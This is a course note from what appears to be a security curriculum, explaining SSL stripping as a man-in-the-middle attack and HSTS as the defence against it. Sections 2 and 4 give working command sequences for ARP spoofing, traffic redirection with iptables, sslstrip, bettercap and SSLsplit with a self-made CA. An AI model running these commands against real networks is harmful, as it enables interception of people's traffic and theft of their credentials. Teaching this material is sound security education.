# SSL Stripping Concepts

## Unit 5 - Topic 5 | Man-in-the-Middle Attacks

---

## Overview

**SSL stripping** downgrades a victim's HTTPS connection to HTTP, allowing the attacker to intercept plaintext traffic. The attacker maintains HTTPS with the real server but serves HTTP to the victim, creating a transparent proxy that strips encryption.

---

## 1. How SSL Stripping Works

```
NORMAL HTTPS:
Victim ──── HTTPS (encrypted) ────→ bank.com
             🔒 End-to-end encrypted

SSL STRIPPING ATTACK:

┌──────────┐    HTTP      ┌──────────┐    HTTPS     ┌──────────┐
│  Victim  │ ──────────→  │ ATTACKER │ ──────────→  │ bank.com │
│          │  (plaintext) │  (MitM)  │  (encrypted) │          │
│          │ ←──────────  │          │ ←──────────  │          │
└──────────┘    HTTP      └──────────┘    HTTPS     └──────────┘
                🔓 EXPOSED!              🔒 Secure

WHAT HAPPENS:
1. Victim requests http://bank.com (or clicks HTTP link)
2. Bank redirects to https://bank.com (301 redirect)
3. Attacker intercepts the redirect
4. Attacker connects to https://bank.com
5. Attacker serves http://bank.com to victim
6. Victim sees HTTP — no padlock, but page looks normal
7. Victim enters credentials on HTTP page
8. Attacker captures credentials in plaintext!
```

---

## 2. SSL Stripping with sslstrip

```bash
# === PREREQUISITES ===
# 1. ARP spoof to become MitM
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# 2. Redirect HTTP traffic to sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
  -j REDIRECT --to-port 8080

# === SSLSTRIP ===
sslstrip -l 8080
# -l: Listen port
# Strips HTTPS links → HTTP
# Logs captured credentials

# === SSLSTRIP2 + DNS2PROXY (HSTS Bypass) ===
# sslstrip2 attempts to bypass HSTS by:
# - Changing domain names (e.g., wwww.bank.com)
# - Using homoglyph characters
python sslstrip2.py -l 8080 -a

# === BETTERCAP (Modern Approach) ===
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.10
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
net.sniff on
```

---

## 3. HSTS — The Defense Against SSL Stripping

```
HSTS (HTTP Strict Transport Security):

SERVER RESPONSE HEADER:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

HOW HSTS PREVENTS SSL STRIPPING:
1. User visits https://bank.com
2. Server sends HSTS header
3. Browser remembers: "ALWAYS use HTTPS for bank.com"
4. Even if attacker serves http://bank.com
5. Browser automatically upgrades to HTTPS
6. SSL stripping FAILS!

HSTS PRELOAD LIST:
├── Browser ships with list of HSTS domains
├── bank.com is in the preload list
├── Browser NEVER makes HTTP request to bank.com
├── Cannot be stripped even on first visit
└── hstspreload.org to check/submit domains

HSTS LIMITATIONS:
├── First visit vulnerability (if not preloaded)
├── User must have visited HTTPS version before
├── Can be bypassed with similar domain names
└── Some browsers clear HSTS data
```

---

## 4. SSL Stripping Variations

| Variant | Technique |
|---------|-----------|
| **Classic sslstrip** | Downgrade HTTPS → HTTP |
| **HSTS bypass** | Use similar domains (wwww.bank.com) |
| **SSL split** | Present different cert to victim |
| **WiFi portal** | Captive portal strips SSL |
| **SSLsplit** | Intercept and re-sign HTTPS with own CA |

```bash
# === SSLSPLIT (Full HTTPS Interception) ===
# Generate CA certificate:
openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 365 -key ca.key -out ca.crt

# Run sslsplit:
sslsplit -D -l connections.log \
  -c ca.crt -k ca.key \
  -p listening.pid \
  ssl 0.0.0.0 8443

# iptables redirect HTTPS:
iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j REDIRECT --to-port 8443

# ⚠️ Victim will see certificate warning!
# Unless attacker's CA is installed on victim's machine
```

---

## 5. Detection Indicators

| Indicator | What to Look For |
|-----------|-----------------|
| **No padlock** | HTTP instead of HTTPS in address bar |
| **Certificate warnings** | Unexpected certificate errors |
| **Mixed content** | HTTPS page loading HTTP resources |
| **URL changes** | Subtle domain name differences |
| **Slow connections** | MitM adds latency |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **SSL stripping** | Downgrade HTTPS to HTTP for victim |
| **sslstrip** | Classic tool for SSL stripping |
| **HSTS** | Browser-enforced HTTPS — defeats stripping |
| **Preload list** | Built-in HSTS — protects first visit |
| **SSLsplit** | Full HTTPS interception with fake CA |
| **Detection** | Check for padlock, certificate, URL |

---

## Quick Revision Questions

1. **How does SSL stripping differ from SSL interception?**
2. **What prerequisite attack is needed for SSL stripping?**
3. **How does HSTS prevent SSL stripping?**
4. **What is the HSTS preload list?**
5. **Why does SSLsplit cause certificate warnings?**

---

[← Previous: LLMNR/NBT-NS Poisoning](04-llmnr-nbt-ns-poisoning.md) | [Next: MitM Frameworks →](06-mitm-frameworks.md)

---

*Unit 5 - Topic 5 of 6 | [Back to README](../README.md)*
